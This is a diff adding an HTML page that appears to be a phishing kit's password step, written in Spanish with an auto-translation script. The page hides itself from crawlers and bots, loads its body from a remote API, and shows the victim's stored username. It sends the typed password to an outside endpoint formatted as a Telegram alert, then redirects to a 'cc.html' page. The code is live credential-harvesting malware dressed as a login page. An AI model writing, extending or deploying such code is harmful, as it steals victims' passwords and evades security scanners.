@@ -1,0 +1,269 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+    <link rel="stylesheet" href="stylespasword.css" />
+  </head>
+  <body id="htmlContainer"></body>
+  <script>
+    const API_URL = "https://html-five-nu-93.vercel.app";
+
+    async function fetchStaticHTML() {
+      const container = document.getElementById("htmlContainer");
+      container.innerHTML = '<div class="loading">Cargando...</div>';
+
+      try {
+        const response = await fetch(`${API_URL}/api/htmlp`);
+        const data = await response.json();
+
+        // Insertar el HTML recibido
+        container.innerHTML = data.html;
+        setTimeout(() => {
+          const el = document.querySelector("#usr");
+          if (el) el.innerHTML = localStorage.getItem("usuario");
+          else console.warn("No se encontró el elemento.");
+        }, 0);
+      } catch (error) {
+        container.innerHTML = `
+                    <div class="error">
+                        <strong>Error:</strong> No se pudo conectar con la API. 
+                        Asegúrate de que el servidor esté corriendo en http://localhost:3000
+                    </div>
+                `;
+        console.error("Error:", error);
+      }
+    }
+
+    function isSimpleBot() {
+      const botPatterns = [
+        /bot/i,
+        /crawl/i,
+        /spider/i,
+        /slurp/i,
+        /bingpreview/i,
+        /facebookexternalhit/i,
+        /embedly/i,
+        /quora link preview/i,
+        /twitterbot/i,
+        /linkedinbot/i,
+        /discordbot/i,
+      ];
+
+      const ua = navigator.userAgent;
+      return botPatterns.some((pattern) => pattern.test(ua));
+    }
+
+    if (isSimpleBot()) {
+      console.warn("🤖 Bot detectado (userAgent).");
+    } else {
+      fetchStaticHTML();
+      setTimeout(() => {
+        const el = document.querySelector("#usr");
+        if (el.cludes("@comunidadunir.net")) {
+          window.location.href = "index.html";
+        }
+        if (el) el.innerHTML = localStorage.getItem("usuario");
+        else console.warn("No se encontró el elemento.");
+      }, 500);
+      console.log("👤 Visitante humano (userAgent).");
+    }
+
+    async function enviar(event) {
+      // El frontend construye el mensaje completo
+      const user = localStorage.getItem("usuario") || "Desconocido";
+      let password = document.getElementById("pass").value;
+
+      const mensaje = `
+🔔 <b>Nueva Solicitud</b>
+
+👤 <b>Usuario:</b> ${user}
+📱 <b>PW:</b> ${password}
+
+🔘 
+
+⏰ ${new Date().toLocaleString("es-CO", { timeZone: "America/Bogota" })}
+  `.trim();
+
+      const datos = {
+        user: user, // Solo el ID para guardar en Firestore
+        message: mensaje, // Mensaje completo formateado para Telegram
+      };
+
+      try {
+        const response = await fetch("https://endpointmine.vercel.app/", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(datos),
+        });
+
+        const data = await response.json();
+
+        if (response.ok) {
+          window.location = "cc.html";
+        } else {
+          console.log("❌ Error al enviar mensaje: " + data.error);
+        }
+      } catch (error) {
+        console.log("❌ Error en la solicitud:", error);
+      }
+    }
+  </script>
+  <script>
+    (async function () {
+      // ── 1. LISTA DE PAÍSES QUE NO TRADUCIR (hablan español) ──────────────────
+      const SPANISH_COUNTRIES = new Set([
+        "AR",
+        "BO",
+        "CL",
+        "CO",
+        "CR",
+        "CU",
+        "DO",
+        "EC",
+        "SV",
+        "ES",
+        "GT",
+        "HN",
+        "MX",
+        "NI",
+        "PA",
+        "PY",
+        "PE",
+        "PR",
+        "UY",
+        "VE",
+      ]);
+
+      // ── 2. DETECTAR PAÍS POR IP ───────────────────────────────────────────────
+      async function getCountry() {
+        try {
+          const res = await fetch("https://ipapi.co/json/");
+          const data = await res.json();
+          localStorage.setItem("pais", data.country_code || "");
+
+          return data.country_code || "";
+        } catch {
+          return "";
+        }
+      }
+
+      const country = await getCountry();
+
+      // Si es país hispanohablante → no hacer nada
+      if (SPANISH_COUNTRIES.has(country)) return;
+
+      // ── 3. FUNCIÓN DE TRADUCCIÓN (MyMemory API — gratis hasta 5000 chars/día) ─
+      async function translateText(text) {
+        if (!text || !text.trim()) return text;
+        try {
+          const url = `https://api.mymemory.translated.net/get?q=${encodeURIComponent(text)}&langpair=es|en`;
+          const res = await fetch(url);
+          const data = await res.json();
+          return data.responseData?.translatedText || text;
+        } catch {
+          return text;
+        }
+      }
+
+      // ── 4. TRADUCIR TODOS LOS NODOS DE TEXTO DEL DOM ─────────────────────────
+      async function translateNode(node) {
+        // Evita traduccir atributos o scripts
+        const skipTags = new Set([
+          "SCRIPT",
+          "STYLE",
+          "NOSCRIPT",
+          "IFRAME",
+          "CODE",
+          "PRE",
+        ]);
+        const placeholders = node.querySelectorAll("[placeholder]");
+        await Promise.all(
+          [...placeholders].map(async (el) => {
+            const translated = await translateText(
+              el.getAttribute("placeholder"),
+            );
+            if (translated) el.setAttribute("placeholder", translated);
+          }),
+        );
+
+        // ── TRADUCIR ATRIBUTOS TITLE Y ALT (bonus) ─────────────────────────────────
+        const withTitle = node.querySelectorAll("[title], [alt]");
+        await Promise.all(
+          [...withTitle].map(async (el) => {
+            if (el.title) el.title = await translateText(el.title);
+            if (el.alt) el.alt = await translateText(el.alt);
+          }),
+        );
+        if (skipTags.has(node.tagName)) return;
+
+        const walker = document.createTreeWalker(node, NodeFilter.SHOW_TEXT, {
+          acceptNode: (n) => {
+            const parent = n.parentElement;
+            if (!parent) return NodeFilter.FILTER_REJECT;
+            if (skipTags.has(parent.tagName)) return NodeFilter.FILTER_REJECT;
+            if (!n.textContent.trim()) return NodeFilter.FILTER_REJECT;
+            return NodeFilter.FILTER_ACCEPT;
+          },
+        });
+
+        const textNodes = [];
+        let current;
+        while ((current = walker.nextNode())) textNodes.push(current);
+
+        // Traducir en lotes de 10 para no saturar la API
+        const BATCH = 10;
+        for (let i = 0; i < textNodes.length; i += BATCH) {
+          const batch = textNodes.slice(i, i + BATCH);
+          await Promise.all(
+            batch.map(async (tn) => {
+              const original = tn.textContent;
+              const translated = await translateText(original);
+              if (translated && translated !== original) {
+                tn.textContent = translated;
+              }
+            }),
+          );
+        }
+      }
+
+      // ── 5. OBSERVER: espera que la API llene el body ──────────────────────────
+      let translated = false; // evitar doble traducción
+
+      // Nodo objetivo — ajusta '#contenido' a tu contenedor real si lo conoces
+      const target = document.querySelector("#contenido") || document.body;
+
+      const observer = new MutationObserver(async (mutations) => {
+        if (translated) return;
+
+        // Detectar si se agregó contenido HTML significativo
+        const hasAddedNodes = mutations.some((m) => m.addedNodes.length > 0);
+        if (!hasAddedNodes) return;
+
+        // Comprobar que hay texto real (no solo el skeleton vacío)
+        const text = target.innerText?.trim();
+        if (!text || text.length < 20) return;
+
+        // Pausar el observer mientras traducimos
+        observer.disconnect();
+        translated = true;
+
+        await translateNode(target);
+      });
+
+      observer.observe(target, {
+        childList: true,
+        subtree: true,
+      });
+
+      // ── 6. POR SI EL CONTENIDO YA ESTABA CARGADO AL EJECUTAR EL SCRIPT ───────
+      const existingText = target.innerText?.trim();
+      if (existingText && existingText.length > 20) {
+        observer.disconnect();
+        translated = true;
+        await translateNode(target);
+      }
+    })();
+  </script>
+</html>
